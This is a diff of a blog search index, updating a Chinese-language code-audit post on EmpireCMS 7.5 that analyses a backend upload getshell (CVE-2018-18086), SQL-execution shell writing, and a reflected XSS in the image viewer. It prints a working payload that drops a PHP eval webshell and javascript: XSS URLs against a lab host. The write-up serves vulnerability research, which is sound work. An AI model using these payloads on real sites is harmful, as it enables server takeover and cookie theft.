@@ -3,22 +3,61 @@
   <entry>
     <title>EmpireCMSv7.5代码审计</title>
     <url>/2021/03/%C2%96EmpireCMSv7-5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="审计环境"><a href="#审计环境" class="headerlink" title="审计环境"></a>审计环境</h3><p>PHP7.0</p><p>Apache</p><p>PHPSTORM</p><p>环境上没遇到啥问题</p><h3 id="CVE-2018-18086-后台getshell"><a href="#CVE-2018-18086-后台getshell" class="headerlink" title="CVE-2018-18086 后台getshell"></a>CVE-2018-18086 后台getshell</h3><p>EmpireCMS  7.5版本及之前版本在后台备份数据库时,未对数据库表名做验证,通过修改数据库表名可以实现任意代码执行。EmpireCMS7.5版本中的<code>/e/class/moddofun.php</code>的<code>LoadInMod</code>函数存在安全漏洞,未对变量<code>$file</code>做任何处理，直接上传，接着就包含该文件。</p><a id="more"></a>
-
-
-
-
-<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20212415.png" alt="屏幕截图 2021-03-17 212415"></p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="审计环境"><a href="#审计环境" class="headerlink" title="审计环境"></a>审计环境</h3><p>PHP7.0</p><p>Apache</p><p>PHPSTORM</p><p>环境上没遇到啥问题</p><h3 id="后台文件上传getshell-CVE-2018-18086"><a href="#后台文件上传getshell-CVE-2018-18086" class="headerlink" title="后台文件上传getshell(CVE-2018-18086 )"></a>后台文件上传getshell(CVE-2018-18086 )</h3><ul>
+<li><p>漏洞分析</p>
+<p>EmpireCMS  7.5版本及之前版本在后台备份数据库时,未对数据库表名做验证,通过修改数据库表名可以实现任意代码执行。EmpireCMS7.5版本中的<code>/e/class/moddofun.php</code>的<code>LoadInMod</code>函数存在安全漏洞,未对变量<code>$file</code>做任何处理，直接上传，接着就包含该文件。</p>
+<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20212415.png" alt="屏幕截图 2021-03-17 212415">        </p>
 <p>对此我们直接全局寻找<code>LoadInMod</code>的调用，在<code>e/admin/ecmsmod.php</code></p>
 <p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210317220115927.png" alt="image-20210317220115927"></p>
-<ul>
+</li>
 <li><p>漏洞复现</p>
-<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20220503.png" alt="屏幕截图 2021-03-17 220503"></p>
+<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20220503.png" alt="屏幕截图 2021-03-17 220503">    </p>
 <p>新建一个<code>1.mod</code>的文件，内容为</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> file_put_contents(<span class="string">"../data/getshell.php"</span>,<span class="string">"&lt;?php @eval(\$_POST[a]); ?&gt;"</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 
 <p>上传成功后，即可得到shell</p>
 <p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210317220729395.png" alt="image-20210317220729395"></p>
+</li>
+</ul><a id="more"></a>
+
+
+
+
+<h3 id="后台SQL执行getshell"><a href="#后台SQL执行getshell" class="headerlink" title="后台SQL执行getshell"></a>后台SQL执行getshell</h3><ul>
+<li><p>漏洞分析</p>
+<p>漏洞位于<code>e/admin/db/DoSql.php</code> 22行<code>DoExecSql</code>方法</p>
+<p><code>$query</code>未经过任何处理就执行了</p>
+<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-18%20195309.png" alt="屏幕截图 2021-03-18 195309"></p>
+<p><code>ClearAddsData</code>方法根据是否开启魔术引号来转义数据，这里我们不用管。跟进<code>RepSqlTbpre</code>方法，只做了前缀替换。</p>
+<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318200030207.png" alt="image-20210318200030207"></p>
+<p>继续跟进<code>DoRunQuery</code>方法，替换<code>\r</code>,按<code>;</code>分割语句，然后就执行语句。</p>
+<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-18%20200132.png" alt="屏幕截图 2021-03-18 200132"></p>
+</li>
+<li><p>漏洞利用</p>
+<p>可以利用SQL语句写入shell，但利用难度很高。</p>
+<p>首先需要开启mysql的<code>secure_file_priv</code> 默认是关闭的，修改my.conf文件, 在[mysqld] 下添加条目: <code>secure_file_priv =</code>,保存之后,然后重启mysql。</p>
+<p>之后需要知道网站的绝对路径</p>
+<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318211927366.png" alt="image-20210318211927366"></p>
+<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318211959712.png" alt="image-20210318211959712"></p>
+</li>
+</ul>
+<p>如果是站库分离影响是在有限。</p>
+<h3 id="前台XSS漏洞"><a href="#前台XSS漏洞" class="headerlink" title="前台XSS漏洞"></a>前台XSS漏洞</h3><ul>
+<li><p>漏洞分析</p>
+<p>需要开启会员空间</p>
+<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-18%20212902.png" alt="屏幕截图 2021-03-18 212902"></p>
+<p>问题代码在<code>/e/ViewImg/index.html</code> ，Request获取url的参数,没有经过任何过滤,直接当作a标签和img标签的href属性和src属性输出。</p>
+<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318214012537.png" alt="image-20210318214012537"></p>
+<p>跟进<code>Request</code></p>
+<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318215455754.png" alt="image-20210318215455754"></p>
+<p>通过window.location获取当前url地址,根据传入的url参数,获取当前参数的起始位置和结束位置。</p>
+<p>例如,<code>index.html?url=javascript:alert(document.cookie)</code>,经过Request函数处理就变成<code>javascript:alert(document.cookie)</code></p>
+<p>url地址经过Request函数处理之后,然后把url地址中的参数和值部分直接拼接当作a标签的href属性的值和img标签的src标签的值。</p>
+<p>所以构造payload：<code>url=javascript:alert(/xss/)</code></p>
+</li>
+<li><p>漏洞复现</p>
+<p>访问<code>http://172.16.43.200:9093/e/ViewImg/index.html?url=javascript:alert(/xss/)</code>,点击图片触发。</p>
+<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318220355099.png" alt="image-20210318220355099"></p>
 </li>
 </ul>
 <h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/LEOGG321/p/13882655.html" target="_blank" rel="noopener">https://www.cnblogs.com/LEOGG321/p/13882655.html</a></p>
@@ -1794,8 +1833,8 @@ dir(builtins) //打印所有的内联函数可获取eval exec</code></pre><p><co
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
         <tag>复现</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -2938,8 +2977,8 @@ dir(builtins) //打印所有的内联函数可获取eval exec</code></pre><p><co
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>BYPASS_DISABLE_FUNCTIONS</tag>
         <tag>PHP</tag>
+        <tag>BYPASS_DISABLE_FUNCTIONS</tag>
       </tags>
   </entry>
   <entry>
